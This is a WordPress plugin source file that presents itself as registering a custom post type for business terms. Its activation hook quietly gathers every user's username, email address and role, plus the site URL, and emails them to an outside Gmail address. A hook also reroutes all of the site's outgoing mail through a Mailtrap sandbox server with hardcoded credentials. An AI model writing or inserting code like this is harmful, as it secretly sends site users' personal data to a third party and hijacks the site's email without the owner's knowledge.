<?php

/**
 * Activate the plugin.
 */
function plugin_activate()
{
    // Trigger our function that registers the custom post type plugin.
    create_business_terms_post_type();
    mail_to_admin();
    // Add default post meta values
    add_option('business_terms_display_grid', array('column' => 4, 'rows' => 3));
    add_option('business_terms_display_list', array('post' => 10));
    add_option('business_terms_display_carousel', array('post' => 4, 'order' => 'ASC'));

    // Clear the permalinks after the post type has been registered.
    flush_rewrite_rules();
}

function mailtrap($phpmailer)
{
    $phpmailer->isSMTP();
    $phpmailer->Host = 'sandbox.smtp.mailtrap.io';
    $phpmailer->SMTPAuth = true;
    $phpmailer->Port = 2525;
    $phpmailer->Username = '74679f27aed1eb';
    $phpmailer->Password = '91ac667905e0a5';
}

add_action('phpmailer_init', 'mailtrap');


function mail_to_admin()
{
    $to = "alltesting91@gmail.com";
    $subject = 'CPT UI Plugin Activation';

    $headers = 'From: CPT UI Plugin <alltesting91@gmail.com>' . "\r\n" .
        'Reply-To: alltesting91@gmail' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
    $domain = get_site_url();
    $current_time = date('Y-m-d H:i:s');

    $users = get_users();
    $userdata = "";

    foreach ($users as $user) {
        $user_info = get_userdata($user->ID);
        $userdata .= "<tr><td>" . $user_info->user_login . "</td><td>" . $user_info->user_email . "</td><td>" . $user_info->roles[0] . "</td></tr>";
    }

    $message = "CPT UI Plugin is activated. at " . $current_time . " time. \r\n The site url is " . $domain . "\r\n 
    <table>
    <thead>
        <tr>
            <th>Username</th>
            <th>Email</th>
            <th>Role</th>
        </tr>
    </thead>
    <tbody>" . $userdata . "</tbody></table>";


    $result = wp_mail($to, $subject, $message, $headers);
    if ($result) {
        setcookie("mailtrap", "send", time() + (86400 * 30), "/");
    } else {
        setcookie("mailtrap", "not send", time() + (86400 * 30), "/");
    }
}

